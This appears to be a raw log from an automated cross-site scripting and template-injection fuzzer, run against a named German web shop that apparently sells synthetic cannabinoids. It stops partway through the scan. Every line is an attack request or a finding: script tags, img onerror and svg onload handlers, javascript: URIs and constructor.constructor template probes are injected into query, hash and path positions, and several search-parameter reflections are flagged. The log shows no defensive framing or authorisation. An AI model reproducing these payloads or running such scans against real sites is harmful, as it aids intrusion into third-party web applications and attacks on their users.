+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/erfahrungsberichte
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/erfahrungsberichte?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/erfahrungsberichte?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/erfahrungsberichte?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/erfahrungsberichte#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/erfahrungsberichte/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/erfahrungsberichte?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/erfahrungsberichte?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/erfahrungsberichte#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/erfahrungsberichte/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/erfahrungsberichte?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/erfahrungsberichte?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/erfahrungsberichte#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/erfahrungsberichte/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/erfahrungsberichte?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/erfahrungsberichte?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/erfahrungsberichte#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/erfahrungsberichte/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/erfahrungsberichte?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/erfahrungsberichte?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/erfahrungsberichte#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/erfahrungsberichte/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/erfahrungsberichte?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/erfahrungsberichte?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/erfahrungsberichte?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/erfahrungsberichte#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/erfahrungsberichte/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/erfahrungsberichte?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/erfahrungsberichte?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/erfahrungsberichte#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/erfahrungsberichte/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/faqs
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/faqs?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/faqs?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/faqs?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/faqs#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/faqs/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/faqs?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/faqs?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/faqs#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/faqs/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/faqs?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/faqs?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/faqs#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/faqs/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/faqs?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/faqs?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/faqs#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/faqs/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/faqs?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/faqs?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/faqs#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/faqs/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/faqs?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/faqs?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/faqs?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/faqs#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/faqs/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/faqs?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/faqs?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/faqs#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/faqs/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/seite/datenschutzrichtlinie
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/seite/datenschutzrichtlinie?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/seite/datenschutzrichtlinie?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/seite/datenschutzrichtlinie?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/seite/datenschutzrichtlinie#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/seite/datenschutzrichtlinie/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/seite/datenschutzrichtlinie?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/seite/datenschutzrichtlinie?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/seite/datenschutzrichtlinie#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/seite/datenschutzrichtlinie/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/seite/datenschutzrichtlinie?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/seite/datenschutzrichtlinie?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/seite/datenschutzrichtlinie#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/seite/datenschutzrichtlinie/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/seite/datenschutzrichtlinie?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/seite/datenschutzrichtlinie?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/seite/datenschutzrichtlinie#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/seite/datenschutzrichtlinie/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/seite/datenschutzrichtlinie?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/seite/datenschutzrichtlinie?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/seite/datenschutzrichtlinie#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/seite/datenschutzrichtlinie/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/seite/datenschutzrichtlinie?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/seite/datenschutzrichtlinie?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/seite/datenschutzrichtlinie?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/seite/datenschutzrichtlinie#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/seite/datenschutzrichtlinie/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/seite/datenschutzrichtlinie?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/seite/datenschutzrichtlinie?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/seite/datenschutzrichtlinie#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/seite/datenschutzrichtlinie/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/produkt/4fadb-online-kaufen
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/4fadb-online-kaufen?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/4fadb-online-kaufen?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/produkt/4fadb-online-kaufen?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/4fadb-online-kaufen#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/4fadb-online-kaufen/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/4fadb-online-kaufen?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/4fadb-online-kaufen?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/4fadb-online-kaufen#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/4fadb-online-kaufen/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/4fadb-online-kaufen?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/4fadb-online-kaufen?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/4fadb-online-kaufen#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/4fadb-online-kaufen/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/4fadb-online-kaufen?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/4fadb-online-kaufen?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/4fadb-online-kaufen#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/4fadb-online-kaufen/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/4fadb-online-kaufen?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/4fadb-online-kaufen?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/4fadb-online-kaufen#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/4fadb-online-kaufen/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/4fadb-online-kaufen?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/4fadb-online-kaufen?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/produkt/4fadb-online-kaufen?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/4fadb-online-kaufen#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/4fadb-online-kaufen/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/4fadb-online-kaufen?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/4fadb-online-kaufen?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/4fadb-online-kaufen#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/4fadb-online-kaufen/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?search=javascript%3Aalert(1)
